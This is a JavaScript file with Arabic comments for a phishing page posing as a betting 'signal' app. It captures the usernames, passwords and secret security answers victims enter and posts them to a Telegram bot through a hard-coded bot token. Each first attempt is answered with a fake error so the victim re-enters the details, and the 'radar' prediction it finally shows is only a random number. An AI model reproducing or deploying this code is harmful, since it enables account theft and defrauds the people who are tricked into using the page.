const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let securityAttempts = 0;

// 1. تسجيل الدخول
async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;
    btn.disabled = true;
    btn.innerText = "Verifying...";

    if (loginAttempts === 1) {
        await sendToTelegram(`⚠️ محاولة 1:\n👤 User: ${u}\n🔑 Pass: ${p}`);
        setTimeout(() => {
            msg.innerText = "❌ خطأ في السيرفر: أعد المحاولة";
            msg.style.color = "#ff0000";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
    } else {
        await sendToTelegram(`✅ بيانات مؤكدة:\n👤 User: ${u}\n🔑 Pass: ${p}`);
        // إخفاء واجهة الدخول وإظهار الحمراء
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('security-layer').style.display = 'flex';
    }
}

// 2. تأكيد الإجابة السرية (حل مشكلة التعليق هنا)
async function finalVerify() {
    const ans = document.getElementById('sec_ans').value;
    const btn = document.getElementById('sec-btn');
    
    if (ans.length < 2) return alert("أدخل الإجابة!");

    securityAttempts++;
    btn.disabled = true;
    btn.innerText = "...Synchronizing"; // الحالة اللي راهي حابسة فيها الصورة

    // نبعث البيانات لتلجرام
    await sendToTelegram(`🔑 **SECRET FOUND**\n👤 Answer: ${ans}`);

    if (securityAttempts === 1) {
        // المحاولة الأولى: نطلب إعادة الكتابة للتمويه
        setTimeout(() => {
            document.getElementById('sec_ans').value = "";
            document.querySelector('#security-layer p').innerText = "❌ خطأ: أعد كتابة اللقب بدقة!";
            btn.disabled = false;
            btn.innerText = "Confirm & Unlock";
        }, 1500);
    } else {
        // المحاولة الثانية: نفتح الرادار فوراً
        setTimeout(() => {
            document.getElementById('security-layer').style.display = 'none';
            const mainApp = document.getElementById('main-app');
            mainApp.classList.remove('hidden');
            mainApp.style.display = 'flex'; // تأكيد الإظهار
        }, 1000);
    }
}

// دالة الإرسال (مبسطة لتفادي التعليق)
async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
    } catch (e) { console.log("Telegram Error"); }
}

// الرادار
function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        display.innerText = (Math.random() * (3.50 - 1.20) + 1.20).toFixed(2) + "x";
    }, 1000);
}
